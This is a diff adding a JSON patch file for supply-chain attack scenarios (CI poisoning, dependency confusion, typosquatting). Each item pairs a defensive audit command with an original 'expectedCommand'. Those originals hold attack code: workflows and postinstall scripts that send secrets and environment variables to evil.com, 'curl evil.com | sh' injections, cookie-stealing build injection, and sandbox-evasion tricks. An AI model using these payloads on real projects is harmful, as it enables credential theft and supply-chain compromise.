@@ -1,0 +1,110 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "supply-ci-poison",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 搜索GitHub Actions配置\ncurl -s \"https://api.github.com/repos/{ORG}/{REPO}/contents/.github/workflows\" \\\n  -H \"Authorization: token {GITHUB_TOKEN}\" | jq '.[].name'\n\n# 分析工作流中的密钥使用\ncurl -s \"https://raw.githubusercontent.com/{ORG}/{REPO}/main/.github/workflows/ci.yml\" | grep -E \"secrets\\.|\\$\\{\\{.*\\}\\}\"",
+          "command": "workflow_dir=.github/workflows\nif [ -d \"$workflow_dir\" ]; then\n  find \"$workflow_dir\" -type f \\( -name '*.yml' -o -name '*.yaml' \\) -print\nfi"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 恶意 .github/workflows/pr-check.yml\nname: PR Check\non:\n  pull_request_target:  # 危险：在主仓上下文执行\n    types: [opened, synchronize]\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: |\n          # PR中的代码在主仓权限下执行\n          echo ${{ secrets.DEPLOY_KEY }} | base64 -w0\n          curl -X POST -d @<(env) https://evil.com/collect",
+          "command": "git grep -nE 'pull_request_target|github\\.event\\.pull_request\\.head\\.(sha|ref)' -- .github/workflows || true\ngit grep -nE 'persist-credentials:[[:space:]]*true|permissions:[[:space:]]*write-all' -- .github/workflows || true"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# PR标题注入\n# 创建标题为以下内容的PR:\n# test`curl evil.com/s|sh`\n\n# 工作流中若有如下写法则存在注入：\nrun: echo \"Checking PR: ${{ github.event.pull_request.title }}\"\n\n# Issue评论注入\n# 评论内容:\n# \"); curl evil.com/steal?token=$GITHUB_TOKEN #\n\n# 注入点搜索\ngrep -rn '\\${{.*github\\.event\\.' .github/workflows/",
+          "command": "git grep -nE 'run:.*\\$\\{\\{[^}]*github\\.event\\.' -- .github/workflows || true\nfind .github/workflows -type f \\( -name '*.yml' -o -name '*.yaml' \\) -exec actionlint {} +"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 篡改构建脚本注入后门\n# 修改 package.json build脚本\n\"scripts\": {\n  \"build\": \"react-scripts build && node inject.js\"\n}\n\n# inject.js——在构建产物中注入代码\nconst fs = require('fs');\nconst buildDir = './build/static/js';\nfs.readdirSync(buildDir).filter(f=>f.endsWith('.js')).forEach(f => {\n  let code = fs.readFileSync(`${buildDir}/${f}`, 'utf8');\n  code += '\\n;fetch(\"https://evil.com/log?c=\"+document.cookie);';\n  fs.writeFileSync(`${buildDir}/${f}`, code);\n});",
+          "command": "mkdir -p artifacts\nfor dir in dist build; do\n  if [ -d \"$dir\" ]; then\n    find \"$dir\" -type f -print0 | sort -z | xargs -0 sha256sum\n  fi\ndone > artifacts/build.sha256"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 使用workflow_dispatch间接触发\n# 避免直接在PR中暴露恶意代码\non:\n  workflow_dispatch:\n    inputs:\n      cmd:\n        description: \"Command\"\n        required: true\nsteps:\n  - run: ${{ github.event.inputs.cmd }}\n\n# 使用第三方Action作为跳板\n- uses: malicious-org/innocent-name@main\n  # 恶意Action内部窃取secrets\n\n# 环境变量泄露——避免直接echo\n- run: |\n    python3 -c \"import os,urllib.request;urllib.request.urlopen(urllib.request.Request('https://evil.com',data=str(dict(os.environ)).encode()))\"",
+          "command": "git grep -nE 'uses:[[:space:]]+[^#[:space:]]+@(main|master|v[0-9]+)' -- .github/workflows || true\ngit grep -nE 'workflow_dispatch:|permissions:' -- .github/workflows || true"
+        }
+      ]
+    },
+    {
+      "id": "supply-dependency-confusion",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 从JavaScript源码中提取import路径\ncurl -s \"https://{TARGET}/static/js/main.js\" | grep -oP \"require\\([\\x27\\x22]@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+[\\x27\\x22]\\)\" | sort -u\n\n# 从package-lock.json泄露中搜索\ncurl -s \"https://{TARGET}/package-lock.json\" 2>/dev/null | jq 'keys' \n\n# GitHub搜索私有包名\n# 搜索: \"@internal-company/\" site:github.com\n\n# 从错误页面/源码注释发现\ncurl -s \"https://{TARGET}\" | grep -oE \"@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+\"",
+          "command": "mkdir -p artifacts\nnode -e \"const fs=require('fs');const p=JSON.parse(fs.readFileSync('package.json','utf8'));console.log(JSON.stringify({dependencies:p.dependencies||{},devDependencies:p.devDependencies||{}},null,2))\" > artifacts/declared-dependencies.json\nnode -e \"const fs=require('fs');const p=JSON.parse(fs.readFileSync('package-lock.json','utf8'));console.log(JSON.stringify({lockfileVersion:p.lockfileVersion,packages:Object.keys(p.packages||{}).length},null,2))\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 创建与内部包同名的公共包\nmkdir dependency-confusion-test && cd dependency-confusion-test\nnpm init -y\n# 设置超高版本号\nnpm version 99.0.0\n\n# 添加无害的检测代码(非恶意)\ncat > index.js << 'EOF'\nconst os = require(\"os\");\nconst dns = require(\"dns\");\nconst pkg = require(\"./package.json\");\n// 仅DNS回调确认安装——无数据外泄\ndns.resolve(`${pkg.name}.${os.hostname()}.dep-test.example.com`, ()=>{});\nEOF\n\nnpm publish --access public",
+          "command": "npm config get registry\nnpm config get @payloader-lab:registry\nnpm config get replace-registry-host"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 使用Burp Collaborator或自建DNS服务器监控\n# Interactsh监控\ninteractsh-client -v 2>&1 | grep \"dep-test\"\n\n# 自建DNS记录\nsudo tcpdump -i eth0 port 53 -l | grep \"dep-test\"\n\n# 也可通过HTTP回调\npython3 -m http.server 8080 &\n# 等待目标CI/CD管道安装包时触发回调",
+          "command": "npm view @payloader-lab/internal-utils versions --registry http://127.0.0.1:4873 --json\nnpm view @payloader-lab/internal-utils dist-tags --registry http://127.0.0.1:4873 --json"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 验证受影响的包管理器行为\n# NPM: 默认优先公共高版本\nnpm install @target-corp/utils --registry https://registry.npmjs.org -dd 2>&1 | grep \"resolved\"\n\n# Python/pip同理\npip install target-corp-utils --index-url https://pypi.org/simple/ -v 2>&1 | grep \"Downloading\"\n\n# 检查是否配置了registry scope\nnpm config get @target-corp:registry",
+          "command": "work_dir=$(mktemp -d)\ntrap 'rm -r -- \"$work_dir\"' EXIT\ncd \"$work_dir\"\nnpm init -y >/dev/null\nnpm install @payloader-lab/internal-utils@1.0.0 --registry http://127.0.0.1:4873 --package-lock-only --ignore-scripts\nnode -e \"const p=require('./package-lock.json');const x=p.packages['node_modules/@payloader-lab/internal-utils'];console.log(JSON.stringify({version:x.version,resolved:x.resolved,integrity:x.integrity},null,2))\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 如果目标使用unscoped包名\n# 直接注册同名公共包(无@scope前缀更容易混淆)\n\n# 跨包管理器攻击\n# 目标用NPM但也尝试PyPI\npip install target-internal-lib  # pip没有scope概念\n\n# 使用prerelease标签\nnpm version 99.0.0-alpha.1\n# 某些配置会匹配 >=1.0.0 范围包括prerelease",
+          "command": "mkdir -p artifacts\nnode -e \"const p=require('./package-lock.json');for(const [k,v] of Object.entries(p.packages||{})){if(v&&v.resolved)console.log([k,v.version,v.resolved,v.integrity||''].join('\\t'))}\" > artifacts/npm-resolution.tsv"
+        }
+      ]
+    },
+    {
+      "id": "supply-typosquat",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 分析目标项目的package.json\ncurl -s \"https://raw.githubusercontent.com/{ORG}/{REPO}/main/package.json\" | jq '.dependencies, .devDependencies'\n\n# 查询高下载量包\nnpm search lodash --json | jq '.[0:5] | .[] | {name, description, version}'",
+          "command": "mkdir -p artifacts\nnode -e \"const fs=require('fs');const p=JSON.parse(fs.readFileSync('package.json','utf8'));console.log([...Object.keys(p.dependencies||{}),...Object.keys(p.devDependencies||{})].sort().join('\\n'))\" > artifacts/npm-dependency-names.txt"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 常见Typosquatting变体生成\noriginal=\"lodash\"\necho \"${original}\" | python3 -c \"\nimport sys\nname=sys.stdin.read().strip()\n# 字符替换: l->1, o->0\nprint(name.replace('l','1'))\n# 连字符变体\nprint(name+'-utils')\nprint(name+'-js')\n# 缺字/多字\nprint(name[:-1])\nprint(name+'s')\n\"\n\n# 检查NPM可用性\nfor pkg in 1odash lodash-utils lodash-js lodas lodashs; do\n  npm view $pkg 2>/dev/null && echo \"$pkg: TAKEN\" || echo \"$pkg: AVAILABLE\"\ndone",
+          "command": "node -e \"const fs=require('fs');const read=f=>fs.readFileSync(f,'utf8').split(/\\r?\\n/).map(x=>x.trim()).filter(Boolean);const approved=read('policy/approved-packages.txt');const observed=read('artifacts/npm-dependency-names.txt');const norm=s=>s.toLowerCase().replace(/[-_.]/g,'');for(const name of observed){for(const expected of approved){if(name!==expected&&norm(name)===norm(expected))console.log(name+'\\t'+expected)}}\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# package.json中植入postinstall钩子\n{\n  \"name\": \"1odash\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Utility library for JavaScript\",\n  \"scripts\": {\n    \"preinstall\": \"node scripts/setup.js\",\n    \"postinstall\": \"node scripts/telemetry.js\"\n  }\n}\n\n# scripts/telemetry.js —— 窃取环境变量\nconst https = require('https');\nconst data = JSON.stringify({\n  env: process.env,\n  cwd: process.cwd(),\n  hostname: require('os').hostname()\n});\nhttps.request({hostname:'evil.com',path:'/collect',method:'POST',headers:{'Content-Type':'application/json'}}, ()=>{}).end(data);",
+          "command": "package_file=./fixtures/package-under-review.tgz\ntar -xOf \"$package_file\" package/package.json | jq '{name,version,scripts,bin}'\ntar -tf \"$package_file\" | sort"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 审计项目依赖安全\nnpm audit --json | jq '.vulnerabilities | to_entries[] | {name: .key, severity: .value.severity}'\n\n# 检查postinstall钩子\nfind node_modules -name \"package.json\" -exec grep -l \"postinstall\\|preinstall\" {} \\;\n\n# 对比lock文件完整性\nnpm ci --dry-run 2>&1 | grep -i \"warn\\|error\"\n\n# Socket.dev检测恶意包\nnpx socket info lodash",
+          "command": "mkdir -p artifacts\nnpm ci --ignore-scripts --dry-run\nnpm audit --package-lock-only --json > artifacts/npm-audit.json"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 延迟执行避开沙箱检测\nsetTimeout(() => {\n  // 恶意代码在30秒后执行，绕过自动化分析超时\n  require('child_process').exec('curl evil.com/c | sh')\n}, 30000);\n\n# 代码混淆\nconst _0x4f2a=['\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73'];\nrequire(_0x4f2a[0]).exec('...');\n\n# 环境检测——仅在CI/CD中触发\nif(process.env.CI || process.env.GITHUB_ACTIONS) {\n  // 仅攻击CI/CD环境\n}",
+          "command": "npm config get ignore-scripts\nrg -n --glob 'package.json' '\"(preinstall|install|postinstall)\"[[:space:]]*:' ."
+        }
+      ]
+    }
+  ]
+}
